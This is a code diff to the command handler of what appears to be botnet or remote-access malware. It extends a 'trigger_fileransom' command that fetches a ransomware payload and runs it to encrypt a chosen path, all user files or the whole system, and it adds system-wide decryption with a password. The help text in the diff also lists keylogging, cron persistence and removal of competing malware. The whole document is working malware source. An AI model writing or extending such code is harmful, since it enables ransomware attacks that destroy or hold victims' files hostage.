@@ -417,7 +417,7 @@ def handle_trigger(cmd):
         """File encryption/decryption ransomware"""
         parts = cmd.split()
         if len(parts) < 2:
-            return "[!] Usage: trigger_fileransom <encrypt/decrypt> <path> [password]"
+            return "[!] Usage: trigger_fileransom <encrypt/decrypt> <path> [password] OR trigger_fileransom encrypt system_<mode> [password]"
         
         action = parts[1]
         fetch_payload("fileransom.py")
@@ -428,7 +428,18 @@ def handle_trigger(cmd):
         if action == "encrypt":
             if len(parts) >= 3:
                 target = parts[2]
-                cmd_args = f"encrypt \"{target}\""
+                
+                # Check for system-wide modes
+                if target.startswith("system_"):
+                    # System-wide encryption
+                    mode = target
+                    cmd_args = f"encrypt --mode {mode}"
+                elif target == "all":
+                    # Encrypt all user files
+                    cmd_args = f"encrypt all"
+                else:
+                    # Normal path encryption
+                    cmd_args = f"encrypt \"{target}\""
             else:
                 cmd_args = "encrypt"
             
@@ -441,12 +452,25 @@ def handle_trigger(cmd):
             return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
         
         elif action == "decrypt":
-            if len(parts) < 4:
-                return "[!] Usage: trigger_fileransom decrypt <path> <password>"
+            if len(parts) < 3:
+                return "[!] Usage: trigger_fileransom decrypt <path/system_wide> <password>"
             
             target = parts[2]
-            password = parts[3]
-            cmd_args = f"decrypt \"{target}\" --password \"{password}\""
+            
+            if target == "system_wide":
+                # System-wide decryption
+                if len(parts) < 4:
+                    return "[!] Usage: trigger_fileransom decrypt system_wide <password>"
+                
+                password = parts[3]
+                cmd_args = f"decrypt system_wide --password \"{password}\""
+            else:
+                # Normal decryption
+                if len(parts) < 4:
+                    return "[!] Usage: trigger_fileransom decrypt <path> <password>"
+                
+                password = parts[3]
+                cmd_args = f"decrypt \"{target}\" --password \"{password}\""
             
             print(f"[+] Starting file decryption")
             return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
@@ -611,7 +635,10 @@ ADVANCED PAYLOADS:
   trigger_cronpersist     - Advanced cron persistence methods
   trigger_compclean       - Clean competitor malware/botnets
   trigger_fileransom encrypt <path> [password] - Encrypt files
+  trigger_fileransom encrypt system_<mode> [password] - System-wide encryption
+  trigger_fileransom encrypt all [password] - Encrypt all user files
   trigger_fileransom decrypt <path> <password> - Decrypt files
+  trigger_fileransom decrypt system_wide <password> - System-wide decryption
 
 MONITORING & COLLECTION:
   trigger_keylogger       - Start keystroke logging
